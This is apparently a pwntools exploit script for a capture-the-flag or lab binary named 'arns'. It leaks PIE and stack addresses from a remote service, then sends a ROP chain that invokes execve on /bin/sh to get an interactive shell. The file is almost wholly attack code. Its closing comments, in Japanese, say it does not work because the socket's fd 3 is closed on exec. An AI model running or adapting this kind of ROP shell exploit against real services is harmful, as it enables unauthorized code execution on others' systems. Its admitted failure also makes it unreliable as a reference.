from pwn import *
elf_file = FILENAME = './arns'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log
'''
HOST = '10.0.128.172'
POST = 8109
'''
HOST = '0.0.0.0'
POST = 8109

YOUR_IP = '0.0.0.0'
YOUR_PORT = 4444



c = remote(HOST, POST)

prsi = 0x0003f5cd
prdi = 0x00052cca
prdx = 0x0004df63
prax = 0x00004af7
prsp = 0x0005409e
syscall = 0x00052db7
ZERO_RDX_SYSCALL = 0x0004c128



c.recvuntil(b'name: ')
c.sendline(b'A')
c.recvline()
leakdata = c.recv(0x20)
leak_pie_addr = u64(leakdata[0x16-0x8:0x1e-0x8])
leak_stack_addr = u64(leakdata[0x16:0x1e])
print(hex(leak_pie_addr))
print(hex(leak_stack_addr))

elf.address = leak_pie_addr - 0x4a781
print(hex(elf.address))

old_stack_target = 0x7fffffffd888
old_leak_stack =   0x7fffffffd960

stack_offset = leak_stack_addr - old_leak_stack + old_stack_target
print(hex(stack_offset))

c.close()



c = remote(HOST, POST)

rop_chain_len = 8 * 7

binsh_addr = stack_offset + rop_chain_len 
binsh_addr_pointer = stack_offset + 0x70

c_addr = stack_offset + 0x40
cmd_addr = stack_offset + 0x48

#c_addr_pointer = stack_offset + 0x70
#cmd_addr_pointer = stack_offset + 0x78

argv_addr = stack_offset + 0x110


rop_chain = p64(elf.address + prax) + p64(59)
rop_chain += p64(elf.address + prdi) + p64(binsh_addr)
rop_chain += p64(elf.address + prsi) + p64(binsh_addr_pointer)
rop_chain += p64(elf.address + ZERO_RDX_SYSCALL)


payload = rop_chain
payload += b'/bin/sh\x00'
payload += b'-c\x00\x00\x00\x00\x00\x00'
command = f"exec 0<&3; exec 1>&3;\x00\x00\x00".encode()
payload += command

payload += p64(elf.address + prsp)
payload += p64(stack_offset)
payload += p64(binsh_addr)
payload += p64(0)
#payload += p64(c_addr)
#payload += p64(cmd_addr)
# --- 攻撃実行 ---
c.sendlineafter(b'name: ', payload)

sleep(0.1) # サーバーがreadに入るのを待つ

c.interactive()

# not working
#なぜならSOCK_CLOEXECがついているから
#つまりexecしたらfd3は閉じられるので成立しない
